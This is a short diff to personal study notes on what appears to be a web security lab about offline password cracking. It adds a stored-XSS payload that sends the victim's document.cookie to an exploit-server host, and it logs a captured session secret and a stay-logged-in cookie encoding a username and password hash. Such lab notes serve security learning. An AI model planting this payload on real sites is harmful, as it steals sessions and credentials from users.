@@ -73,3 +73,12 @@ wiener:51dc30ddc473d43a6011e9ebba6ca770
 
 ![[Pasted image 20240829123137.png]]
 
+# Offline password cracking
+
+XSS
+```html
+<script>document.location='//exploit-0ae1001a041d54ab8236324601b70073/'+document.cookie</script>
+```
+
+/secret=T88cI38wn5zNcV3RIgyxp6qZayCMm1FG;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+
